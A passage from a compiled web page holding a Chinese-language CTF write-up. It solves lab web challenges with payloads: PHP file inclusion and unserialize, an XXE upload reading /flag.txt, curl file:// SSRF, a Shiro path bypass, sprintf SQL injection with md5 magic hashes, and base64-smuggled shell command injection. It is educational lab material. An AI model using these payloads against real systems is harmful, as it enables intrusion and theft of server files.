vul-tm-ctf.dun.mi.com\n http/2: \nCookie: MIDUNCOOKIE\nSec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: "macOS"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\n\n\n'})}),"\n",(0,i.jsxs)(n.h3,{id:"web-11-unserialize",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-11-unserialize",children:"#"}),"web-11 unserialize"]}),"\n",(0,i.jsx)(n.p,{children:"\u9898\u76EE\u63D0\u793A\u7ED9\u4E86\u4E24\u4E2A\u53C2\u6570file\u548Cdata\uFF0Cfile\u662F\u4E00\u4E2A\u6587\u4EF6\u5305\u542B\u547D\u4EE4\uFF0Cdata\u7684\u4F5C\u7528\u8FD8\u4E0D\u77E5\u9053\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u9996\u5148\u901A\u8FC7file\u5C06index.php\u7684\u6E90\u7801\u83B7\u53D6\u8FC7\u6765"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"http://10.167.34.63/index.php?file=php://filter/read=convert.base64-encode/resource=index.php\n"})}),"\n",(0,i.jsx)(n.p,{children:"base64\u89E3\u7801\u540E\u5C31\u53D8\u6210\u4E86\u4E00\u4E2A\u5B9E\u9645\u7684\u4EE3\u7801\u5BA1\u8BA1\u9898\u76EE"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",meta:"",children:'<?php\nif(isset($_GET[\'file\'])){\n    $file = $_GET[\'file\'];\n    if(preg_match("/flag/i", $file)){\n        die("\u6211\u77E5\u9053\u4F60\u77E5\u9053\u4E86\u6587\u4EF6\u4F4D\u7F6E\uFF0C\u4F46\u8BF7\u4E0D\u8981\u76F4\u63A5\u83B7\u53D6\u5B83");\n    }\n    else{\n        include "$file";\n    }\n}\n\n\nclass Example {\n    public $file;\n\n    function __destruct() {\n        if(file_exists($this->file)) {\n            echo file_get_contents($this->file);\n        }\n    }\n}\n\nif (isset($_GET[\'data\'])) {\n    $s_data = $_GET[\'data\'];\n    $uns_data = unserialize($s_data);\n\n    if ($uns_data instanceof Example) {\n        echo "Data unserialized successfully.";\n    } else {\n        echo "Invalid data.";\n    }\n} else {\n    echo "flag? Try file= or data= ";\n}\n?>\n'})}),"\n",(0,i.jsxs)(n.p,{children:["\u5173\u952E\u662F\u5BF9data\u5904\u7406\uFF0C\u9996\u5148\u5C06data\u53CD\u5E8F\u5217\u5316\uFF0C\u7136\u540EExample\u5728\u9500\u6BC1\u7684\u65F6\u5019\u4F1A\u81EA\u52A8\u6253\u5370 ",(0,i.jsx)(n.strong,{children:"$file"})," \u7684\u5185\u5BB9\u3002\n\u4E8E\u662F\u5C31\u60F3\u5230\u5E8F\u5217\u5316\u6784\u9020\u4E00\u4E2A\u6570\u636E\uFF0C\u7136\u540E\u901A\u8FC7data\u53CD\u5E8F\u5217\u5316\u6765\u8D4B\u503C ",(0,i.jsx)(n.strong,{children:"$file"})," \u53C2\u6570\uFF0C\u6700\u7EC8\u83B7\u53D6flag\u5185\u5BB9\u3002"]}),"\n",(0,i.jsx)(n.p,{children:"\u6784\u9020Example\u5E8F\u5217\u5316\u6570\u636E"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",meta:"",children:'<?php\nprint("Hello, World\\n");\nclass Example {\n    public $file = "/flag.txt";\n\n    function __destruct() {\n        if(file_exists($this->file)) {\n            echo file_get_contents($this->file);\n        }\n    }\n}\n$a = new Example();\nprint(var_dump(serialize($a)));\n?>\n// string(45) "O:7:"Example":1:{s:4:"file";s:9:"/flag.txt";}"\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u6784\u9020url\u6267\u884C"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:'http://10.167.34.63/index.php?file=php://filter/read=convert.base64-encode/resource=index.php&data=O:7:"Example":1:{s:4:"file";s:9:"/flag.txt";}\n'})}),"\n",(0,i.jsxs)(n.h3,{id:"web-12-\u4E0D\u5B89\u5168\u7684\u4EE3\u7406\u670D\u52A1",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-12-\u4E0D\u5B89\u5168\u7684\u4EE3\u7406\u670D\u52A1",children:"#"}),"web-12 \u4E0D\u5B89\u5168\u7684\u4EE3\u7406\u670D\u52A1"]}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u4E2A\u9898\u6CA1\u592A\u61C2\uFF0C\u5C31\u662F\u4E00\u4E2A\u9875\u9762\u653E\u4E86\u4E00\u4F1A\u513F\uFF0C\u5237\u5237\u7684\u5728\u8DD1\u6D41\u91CF\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u6D41\u91CF\u76D1\u6D4B",src:en})}),"\n",(0,i.jsx)(n.p,{children:"\u53D1\u73B0\u6709\u7684public\u63A5\u53E3\u91CC\u9644\u5E26\u4E86\u57FA\u672C\u7684\u8BA4\u8BC1\u53C2\u6570\uFF0Cflag\u63A5\u53E3\u63D0\u793A\u672A\u8BA4\u8BC1\u3002\u5C31\u60F3\u5230\u91CD\u653Eflag\u63A5\u53E3\uFF0C\u5E76\u6DFB\u52A0\u8BA4\u8BC1\u53C2\u6570\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u91CD\u653E\u8BF7\u6C42",src:et})}),"\n",(0,i.jsx)(n.p,{children:"\u6210\u529F\u83B7\u53D6\u4E86flag\u3002"}),"\n",(0,i.jsxs)(n.h3,{id:"web-13-php-audit",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-13-php-audit",children:"#"}),"web-13 php-audit"]}),"\n",(0,i.jsx)(n.p,{children:"php\u6E90\u7801\u5BA1\u8BA1\u9898\u76EE\uFF0C\u53D1\u73B0\u7981\u6B62\u8BF7\u6C42localhost\uFF0C\u4F46\u662F\u53C8\u544A\u8BC9\u4F60flag\u5728\u54EA\u91CC"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"php\u6E90\u7801",src:ei})}),"\n",(0,i.jsx)(n.p,{children:"\u5229\u7528curl\u7684file\u534F\u8BAE\uFF0C\u8BBF\u95EE\u672C\u5730\u6587\u4EF6\uFF0C\u6784\u9020url\uFF0C\u83B7\u53D6flag"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.a,{href:"http://10.167.34.65/index.php?url=file:///var/www/html/flag.php",target:"_blank",rel:"noopener noreferrer",children:"http://10.167.34.65/index.php?url=file:///var/www/html/flag.php"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u7ED3\u679C",src:er})}),"\n",(0,i.jsxs)(n.h3,{id:"web-14-jenkins",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-14-jenkins",children:"#"}),"web-14 jenkins"]}),"\n",(0,i.jsx)(n.p,{children:"\u7ED9\u4E86\u4E00\u4E2Ajenkins\u7CFB\u7EDF\uFF0C\u672A\u767B\u5F55\u3002\u8BD5\u4E86\u4E00\u4E0B\u5F31\u53E3\u4EE4admin/admin\uFF0C\u5C45\u7136\u767B\u5F55\u8FDB\u53BB\u4E86\u3002\u5F00\u59CB\u627E\u80FD\u5217\u76EE\u5F55\u7684\u5730\u65B9\u3002\u627E\u4E86\u51E0\u5708\u5728\u8282\u70B9\u7BA1\u7406\u91CC\u53D1\u73B0\u4E00\u4E2A\u6267\u884C\u547D\u4EE4\u7684\u8F93\u5165\u6846\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"jenkins\u811A\u672C\u547D\u4EE4\u884C",src:es})}),"\n",(0,i.jsx)(n.p,{children:"\u67E5\u627Eflag\u7684\u4F4D\u7F6E\uFF0C\u6700\u540E\u8F93\u51FAflag\u3002"}),"\n",(0,i.jsxs)(n.h3,{id:"web-15-\u4E00\u4E2Ablog",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-15-\u4E00\u4E2Ablog",children:"#"}),"web-15 \u4E00\u4E2Ablog"]}),"\n",(0,i.jsx)(n.p,{children:"\u6587\u4EF6\u5305\u542B\uFF0Chtml\u91CC\u63D0\u4F9B\u4E86\u5305\u542B\u7684\u6E90\u7801"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",meta:"",children:"$page = $_GET['page'];\n$allowed_pages = array('home', 'about', 'contact');\n\nif(isset($page) && !in_array($page, array('flag'))){\ninclude($page . '.php');\n} else {\ninclude('home.php');\n} \n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u53EF\u4EE5\u53D1\u73B0\uFF0C\u53EA\u8981page\u53C2\u6570\u4E0D\u7B49\u4E8E",(0,i.jsx)(n.code,{children:"flag"}),"\uFF0C\u5C31\u76F4\u63A5\u4E0E.php\u62FC\u63A5\u7136\u540Einclude\u8FDB\u6765\u3002"]}),"\n",(0,i.jsxs)(n.p,{children:["\u6240\u4EE5\uFF0C\u53EF\u4EE5\u4F7F\u7528\u76F8\u5BF9\u8DEF\u5F84\u7ED5\u8FC7\u5BF9\u9ED1\u540D\u5355\u7684\u5224\u65AD",(0,i.jsx)(n.code,{children:"page=./flag"})]}),"\n",(0,i.jsxs)(n.h3,{id:"web-16-\u8BA4\u8BC1\u7ED5\u8FC7",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-16-\u8BA4\u8BC1\u7ED5\u8FC7",children:"#"}),"web-16 \u8BA4\u8BC1\u7ED5\u8FC7"]}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u4E2A\u9898\u521A\u5F00\u59CB\u65E0\u4ECE\u4E0B\u624B\uFF0C\u5C31\u5728\u4E71\u8BD5\u3002\u9875\u9762\u5C31\u63D0\u4F9B\u4E86\u4E00\u4E2A/doLogin\u63A5\u53E3\u548C\u767B\u5F55\u5931\u8D25\u63D0\u793A\u53EF\u4EE5\u901A\u8FC7/flag/get\u83B7\u53D6flag\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u5F00\u59CB\u60F3\u5230sql\u6CE8\u5165\uFF0C\u4F46\u662F\u8FD9\u4E2A\u9898\u76EE\u6807\u9898\u4E0D\u50CF\u662F\u901A\u8FC7sql\u8FDB\u884C\u64CD\u4F5C\u7684\u6837\u5B50\u3002\u4E8E\u662F\u5C31\u627E\u54CD\u5E94\u7684\u53EF\u4EE5\u70B9\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u6709\u4E2A\u53EF\u4EE5\u70B9\u662F/doLogin\u63A5\u53E3\u4F1A\u5C06RememberMe\u7684cookie\u5220\u6389\u3002\u901A\u8FC7\u8FD9\u4E2A\u5173\u952E\u8BCD\u5165\u624B\uFF0C\u53D1\u73B0shiro\u5B58\u5728\u8BA4\u8BC1\u7ED5\u8FC7\u6F0F\u6D1E\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u6709\u4E24\u7C7B\uFF0C\u4E00\u7C7B\u662F\u901A\u8FC7\u7206\u7834Remember\u7684\u52A0\u5BC6\u65B9\u5F0F\uFF0C\u83B7\u53D6\u52A0\u5BC6\u5BC6\u94A5\u4FEE\u6539\u6743\u9650\u3002\u8FD9\u4E2A\u9898\u76EE\u6CA1\u6709RememberMe\u7684\u76F8\u5173\u529F\u80FD\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u7B2C\u4E8C\u7C7B\u662F\u6784\u9020\u7279\u6B8A\u8DEF\u5F84\uFF0C\u7ED5\u8FC7shiro\u7684\u6743\u9650\u5BF9\u8DEF\u5F84\u7684\u5224\u65AD\u3002\u5C1D\u8BD5\u4E86\u51E0\u4E2A\uFF0C\u53D1\u73B0CVE-2020-13933\u53EF\u4EE5\u4F7F\u7528\u3002\u6210\u529F\u83B7\u53D6flag\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"GET /flag/%3bget HTTP/1.1\n"})}),"\n",(0,i.jsxs)(n.h3,{id:"web-17-\u6587\u4EF6\u89E3\u6790\u5668",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-17-\u6587\u4EF6\u89E3\u6790\u5668",children:"#"}),"web-17 \u6587\u4EF6\u89E3\u6790\u5668"]}),"\n",(0,i.jsx)(n.p,{children:"hint\u8BF4\u53EF\u4EE5\u89E3\u6790xml\u3002\u3002\u3002\u8C37\u4E86\u4E00\u4E0B\u6709\u4E2ABlind XXE\u5B9E\u4F53\u5F15\u5165\u7684\u53EF\u4EE5\u5229\u7528\u3002\u800C\u4E14\u4E5F\u80FD\u6B63\u5E38\u56DE\u663E\u3002\u5269\u4E0B\u7684\u95EE\u9898\u662Fflag\u7684\u8DEF\u5F84\u5728\u54EA\u91CC\uFF1F\u968F\u4FBF\u731C\u4E86\u51E0\u4E2A\uFF0C\u8FD0\u6C14\u597D\u731C\u5230\u4E86\u3002\u3002\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-http",meta:"request",children:'POST /upload HTTP/1.1\nHost: 10.167.191.230:8080\nContent-Length: 361\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://10.167.191.230:8080\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarycLlwfudSbAubDEQp\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://10.167.191.230:8080/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\n------WebKitFormBoundarycLlwfudSbAubDEQp\nContent-Disposition: form-data; name="file"; filename="island_extend.png"\nContent-Type: image/svg+xml\n\n<?xml version="1.0" encoding="utf-8"?>\n<!DOCTYPE test[\n<!ENTITY file SYSTEM "file:///flag.txt">\n]>\n<reset><login>&file;</login><secret>Any bugs?</secret></reset>\n\n------WebKitFormBoundarycLlwfudSbAubDEQp--\n\n'})}),"\n",(0,i.jsxs)(n.h3,{id:"web-18-self-gpt---1",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-18-self-gpt---1",children:"#"}),"web-18 SELF GPT - 1"]}),"\n",(0,i.jsxs)(n.p,{children:["\u662F\u4E2A\u6BD4\u8F83\u6709\u540D\u7684\u5F00\u6E90\u9879\u76EE ",(0,i.jsx)(n.a,{href:"https://github.com/binary-husky/gpt_academic",target:"_blank",rel:"noopener noreferrer",children:"https://github.com/binary-husky/gpt_academic"})," \uFF0C\u5148\u4E0B\u8F7D\u4EE3\u7801\u770B\u4E86\u4E00\u4E0B\u3002"]}),"\n",(0,i.jsx)(n.p,{children:"issue\u91CC\u6709\u4EBA\u63D0\u5230\u4E86\u9879\u76EE\u5B58\u5728\u6F0F\u6D1E\uFF0C\u4F46\u662F\u6CA1\u6709\u540E\u6587\u4E86\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u7136\u540E\u5C31\u653E\u5728\u90A3\u91CC\u6CA1\u6709\u7406\u5B83\u3002\u3002\u3002"}),"\n",(0,i.jsx)(n.p,{children:"==================One Year Later================"}),"\n",(0,i.jsx)(n.p,{children:"\u60F3\u8D77\u6765\u53C8\u62FF\u51FA\u6765\u770B\u770B\u3002\u5F00\u59CB\u627Epython\u76F8\u5173\u7684\u6F0F\u6D1E\u3002"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"\u9996\u5148\u60F3\u5230\u7684\u662F\u6709\u6CA1\u6709\u8C03\u7528\u7CFB\u7EDFshell\u6267\u884C\u547D\u4EE4\u7684\u5730\u65B9\u3002\u53D1\u73B0\u4E86\u4E00\u4E2A\u8C03\u7528\u7CFB\u7EDF\u547D\u4EE4wget\u4E0B\u8F7D\u6587\u732E\u7684\u5730\u65B9\uFF0C\u4F46\u662F\u88AB\u6CE8\u91CA\u4E86\u3002"}),"\n",(0,i.jsx)(n.li,{children:"\u9879\u76EE\u4F7F\u7528\u4E86\u4E0A\u4F20\u548C\u89E3\u538B\u538B\u7F29\u6587\u4EF6\u7684\u529F\u80FD\u3002\u641C\u4E86\u4E00\u4E0B\uFF0C\u76F8\u5173\u5229\u7528\u65B9\u5F0F\u662F\u4E0A\u4F20\u4E00\u4E2A\u5E26\u8F6F\u94FE\u7684\u76EE\u5F55\uFF0C\u8BBF\u95EE\u4EFB\u610F\u76EE\u5F55\u3002"}),"\n",(0,i.jsxs)(n.li,{children:["\u4E0A\u4F20\u7684\u6587\u4EF6\u600E\u4E48\u4E0B\u8F7D\u4E0B\u6765\u3002\u53D1\u73B0\u6709\u4E2A\u4E0B\u8F7D\u6587\u4EF6\u7684\u63A5\u53E3\uFF0C\u5F00\u653E\u4E86",(0,i.jsx)(n.code,{children:"/tmp/gradio/[\u968F\u673A\u4E32]"}),"\u7684\u4E34\u65F6\u76EE\u5F55\uFF0C\u548C",(0,i.jsx)(n.code,{children:"private_upload/[\u65E5\u671F\u65F6\u95F4]/[\u4E0A\u4F20\u6587\u4EF6\u540D]"}),"\u7684\u76EE\u5F55\u3002\u53EA\u80FD\u8BBF\u95EE\u5230\u5177\u4F53\u6587\u4EF6\uFF0C\u6CA1\u6709\u5217\u76EE\u5F55\u7684\u80FD\u529B\u3002\n",(0,i.jsx)(n.img,{alt:"\u6587\u4EF6\u4E0A\u4F20\u4E0B\u8F7D",src:ea})]}),"\n",(0,i.jsxs)(n.li,{children:["\u7136\u540E\u5F00\u59CB\u6784\u9020\u8F6F\u94FE\uFF0C\u6D4B\u8BD5\u6587\u4EF6\u3002\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"/etc/hosts \u53EF\u4EE5\u8BBF\u95EE"}),"\n",(0,i.jsx)(n.li,{children:"/etc/passwd \u53EF\u4EE5\u8BBF\u95EE"}),"\n",(0,i.jsx)(n.li,{children:"/home/work \u6CA1\u6709\u5185\u5BB9"}),"\n",(0,i.jsx)(n.li,{children:"../../.././xxxxxxxx/flag\u7B49\u53EF\u80FD\u7684flag\u6587\u4EF6\uFF0C\u6CA1\u6709\u627E\u5230"}),"\n",(0,i.jsx)(n.li,{children:"/root/.bash_history \u6CA1\u6709\u6743\u9650"}),"\n",(0,i.jsx)(n.li,{children:"\u53C8\u8BD5\u4E86\u51E0\u4E2A\u76EE\u5F55\uFF0C../\u7684\u8F6F\u94FE\u4F1A\u9012\u5F52\uFF0C\u7136\u540E\u7528\u6839\u76EE\u5F55\u7684\u8F6F\u94FE\u7684\u8BDD\uFF0C\u7A0B\u5E8F\u4F1A\u5361\u6B7B\u3002\u3002\u3002"}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.li,{children:"\u5C1D\u8BD5\u4E86\u597D\u591A\u79CD\u65B9\u6CD5\u6CA1\u6709\u7A81\u7834\u3002\u95EE\u9898\u5C31\u5361\u5728\u5982\u4F55\u901A\u8FC7\u5217\u76EE\u5F55\u627E\u5230flag\u6587\u4EF6\uFF08\u6709\u70B9\u60F3\u653E\u5F03\uFF09"}),"\n",(0,i.jsxs)(n.li,{children:["\u731B\u7136\u95F4\u60F3\u5230\u8981\u4E0D\u4ECE\u9879\u76EE\u672C\u8EAB\u7684\u6587\u4EF6\u627E\u627E\u7A81\u7834\u53E3\uFF1F\n",(0,i.jsx)(n.img,{alt:"\u81EA\u8EAB\u6587\u4EF6",src:ec})]}),"\n",(0,i.jsxs)(n.li,{children:["\u6784\u9020\u4E86\u4E00\u4E2A\u8FD4\u56DE\u4E0A\u51E0\u7EA7\u7684\u8F6F\u94FE\uFF0C\u770B\u4E86\u4E00\u4E0B\u8FD9\u51E0\u4E2A\u6587\u4EF6\u7684\u5185\u5BB9\uFF0C\u6700\u540E\u7EC8\u4E8E\u5728config.py\u53D1\u73B0\u4E86\u786C\u7F16\u7801\u7684flag\u3002flag{9fdeb6b22d04f449360f99414397055e}\n",(0,i.jsx)(n.img,{alt:"config\u4E2D\u7684flag",src:el})]}),"\n"]}),"\n",(0,i.jsxs)(n.h3,{id:"web-19-\u7C97\u5FC3\u7684\u7A0B\u5E8F\u5458",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-19-\u7C97\u5FC3\u7684\u7A0B\u5E8F\u5458",children:"#"}),"web-19 \u7C97\u5FC3\u7684\u7A0B\u5E8F\u5458\uFF01"]}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u4E2A\u9898\u7684\u70B9\u6BD4\u8F83\u591A\uFF0C\u9700\u8981\u5404\u4E2A\u51FB\u7834\u3002"}),"\n",(0,i.jsxs)(n.p,{children:["\u7B2C\u4E00\u4E2A\u70B9\u662Fvim\uFF0C\u5F88\u5BB9\u6613\u60F3\u5230\u4E86vim\u7684\u4EA4\u6362\u6587\u4EF6\uFF0C\u8BBF\u95EE ",(0,i.jsx)(n.code,{children:".index.php.swp"})," \u83B7\u53D6\u5230\u4EA4\u6362\u6587\u4EF6\u3002"]}),"\n",(0,i.jsxs)(n.p,{children:["\u6267\u884C ",(0,i.jsx)(n.code,{children:"vim -r .index.php.swp"})," \u8FD8\u539F\u51FA\u539F\u6587\u4EF6\u3002"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",meta:"",children:'<?php\n\ninclude("conn.php");\n\n$username = addslashes($_GET["username"]);\n$age = addslashes($_GET["age"]);\n$password = addslashes($_GET["password"]);\n$password1 = addslashes($_GET["password1"]);\n\n$sql = "SELECT username, age FROM user_info";\n$sub_sql = " AND username = \'{$username}\'";\n$sql = sprintf("SELECT username, age FROM user_info WHERE age = \'%s\'".$sub_sql, $age);\necho "\x3c!--".$sql."-->";\n$result = $conn->query($sql);\n\nif ($result->num_rows > 0) {\n    while($row = $result->fetch_assoc()) {\n        if ($row["age"] == 999 && $password != $password1 && md5($password) == md5($password1)) {\n                    echo "Congratulations! Flag is ".$flag;\n                    die();\n        } else {\n            echo "My name is:".$row["username"];\n            echo "<br>";\n            echo "My Age is:" . $row["age"];\n            die();\n        }\n    }\n} else {\n    echo "My name is:".$row["username"];\n            echo "<br>";\n            echo "My Age is:" . $row["age"];\n            echo "<br>";\n            echo "I am a coder. My favorite IDE is VIM, do you like it?";\n    die();\n}\n\n$conn->close();\n?>\n'})}),"\n",(0,i.jsxs)(n.p,{children:["\u7B2C\u4E8C\u4E2A\u662Fsprintf+addslashes\u7684SQL\u6CE8\u5165\uFF0C\u53EA\u8981\u6784\u9020 ",(0,i.jsx)(n.code,{children:"%1$' or 1#"})," \u5728addslashes\u7684\u4F5C\u7528\u4E0B\u5728\u5355\u5F15\u53F7\u524D\u9762\u4F1A\u63D2\u5165\u4E00\u4E2A\\\uFF0C\u5F53\u4F20\u5165sprintf\u65F6",(0,i.jsx)(n.code,{children:"%"}),"\u5C31\u4F1A\u2018\u541E\u6389\u2019\u540E\u9762\u7684\\\uFF0C\u4ECE\u800C\u2018\u2019\u2019\u9003\u9038\u51FA\u6765\uFF0C\u5B8C\u6210\u6CE8\u5165\u3002"]}),"\n",(0,i.jsx)(n.p,{children:"\u7B2C\u4E09\u4E2A\u9700\u8981\u8DF3\u8FC7\u7B2C18\u884C\u7684\u4E09\u4E2A\u5224\u65AD\u6761\u4EF6\uFF1A"}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["\u5E74\u9F84\u7B49\u4E8E999\uFF0C\u8FD9\u600E\u4E48\u53EF\u80FD\u3002\u53EF\u4EE5\u5728sql\u540E\u9762\u901A\u8FC7union all\u7684\u65B9\u5F0F\u8865\u5145\u4E00\u6761\u5047\u7684\u6570\u636E ",(0,i.jsx)(n.code,{children:"%1$'  union all select 1, 999 #"})]}),"\n",(0,i.jsx)(n.li,{children:"password\u548Cpassword1\u7684\u503C\u4E0D\u76F8\u7B49\uFF0C\u4F46\u662Fmd5\u8FD0\u7B97\u5374\u76F8\u7B49\u3002\u521A\u5F00\u59CB\u60F3\u5230\u4E86md5\u78B0\u649E\uFF0C\u4F46\u662F\u540E\u6765\u60F3\u4E86\u60F3\u4E0D\u5E94\u8BE5\u8FD9\u4E48\u590D\u6742\uFF0C\u5C31\u53D1\u73B0\u4E86PHP\u6709\u4E2A\u9690\u5F0F\u8F6C\u6362\u7684\u7F3A\u9677\uFF0CPHP\u5728\u5904\u7406\u54C8\u5E0C\u5B57\u7B26\u4E32\u65F6\uFF0C\u4F1A\u5229\u7528\u201D!=\u201D\u6216\u201D==\u201D\u6765\u5BF9\u54C8\u5E0C\u503C\u8FDB\u884C\u6BD4\u8F83\uFF0C\u5B83\u628A\u6BCF\u4E00\u4E2A\u4EE5\u201D0E\u201D\u5F00\u5934\u7684\u54C8\u5E0C\u503C\u90FD\u89E3\u91CA\u4E3A0\uFF0C\u6240\u4EE5\u5982\u679C\u4E24\u4E2A\u4E0D\u540C\u7684\u5BC6\u7801\u7ECF\u8FC7\u54C8\u5E0C\u4EE5\u540E\uFF0C\u5176\u54C8\u5E0C\u503C\u90FD\u662F\u4EE5\u201D0E\u201D\u5F00\u5934\u7684\uFF0C\u90A3\u4E48PHP\u5C06\u4F1A\u8BA4\u4E3A\u4ED6\u4EEC\u76F8\u540C\uFF0C\u90FD\u662F0\u3002 \u6784\u9020\u4F8B\u5B50 QNKCDZO 240610708 \u5F53\u7136\uFF0C\u5B89\u5168\u7684\u6BD4\u8F83\u65B9\u6CD5\u662F\u4E09\u4E2A=\uFF0C\u4E5F\u5C31\u662F\u201C===\u201D\u3002"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"\u5B8C\u6210\u4EE5\u4E0A\u6240\u6709\u7684\u70B9\u4E4B\u540E\uFF0C\u6700\u7EC8\u6784\u9020\u51FA\u6765\u7684url\u5C31\u6709\u4E86\u3002\u8BF7\u6C42\u83B7\u53D6flag"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"https://sqli-ctfd.dun.mi.com/index.php?username=%1$' union all select 1, 999 %23&age=999&password=QNKCDZO&password1=240610708\n"})}),"\n",(0,i.jsxs)(n.h3,{id:"web-21-\u4E00\u4E2A\u7F51\u7EDC\u6D4B\u8BD5\u5DE5\u5177",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#web-21-\u4E00\u4E2A\u7F51\u7EDC\u6D4B\u8BD5\u5DE5\u5177",children:"#"}),"web-21 \u4E00\u4E2A\u7F51\u7EDC\u6D4B\u8BD5\u5DE5\u5177"]}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u4E2A\u9898\u76EE\u4F20\u9012\u4E00\u4E2Aip\u53C2\u6570\uFF0C\u4F1A\u5BF9\u8FD9\u4E2A\u53C2\u6570\u6267\u884Cping\u547D\u4EE4\u3002\u60F3\u5230\u4E86\u540E\u7AEF\u662F\u4E0D\u662F\u4F7F\u7528\u4E86\u547D\u4EE4\u62FC\u63A5\u76F4\u63A5\u4EA4\u4E2Ashell\u6267\u884C\u3002\u5C1D\u8BD5\u5206\u9694\u547D\u4EE4\uFF0C\u5F15\u5165\u81EA\u5DF1\u7684\u547D\u4EE4\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u8BD5\u4E86\u51E0\u4E2A\u5206\u9694\u7B26\u90FD\u4E0D\u884C\uFF0C\u800C\u4E14\u4F7F\u7528\u4E86\u9ED1\u540D\u5355\u7684\u5206\u9694\u7B26\u4F1A\u51FA\u73B0\u7981\u6B62\u8BBF\u95EE\u7684\u9875\u9762\u3002\uFF08\u8BD5\u5206\u9694\u7B26\u5361\u4E86\u597D\u4E45\u3002\u3002\u3002\uFF09"}),"\n",(0,i.jsx)(n.p,{children:"\u5FFD\u7136\u60F3\u5230ip\u7684\u5185\u5BB9\u4F1A\u56DE\u663E\u5230\u9875\u9762\uFF0C\u53EF\u4E0D\u53EF\u4EE5\u901A\u8FC7\u4E8C\u6B21\u8FD0\u7B97\u7684\u65B9\u5F0F\u8BA9\u6267\u884C\u547D\u4EE4\u7684\u7ED3\u679C\u901A\u8FC7ping\u547D\u4EE4\u7684\u62A5\u9519\u56DE\u663E\u51FA\u6765\u3002\u6309\u7167\u8FD9\u4E2A\u601D\u8DEF\u914D\u5408base64\u7F16\u7801\u7ED5\u8FC7\u5B57\u7B26\u68C0\u6D4B\uFF0C\u6210\u529F\u83B7\u53D6\u5230\u4E86\u6587\u4EF6\u5185\u5BB9\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"// cat index.php\n$($(base64 -d <<< Y2F0IGluZGV4LnBocA==))\n\n// cat /etc/getflag.php\n$($(base64 -d <<< 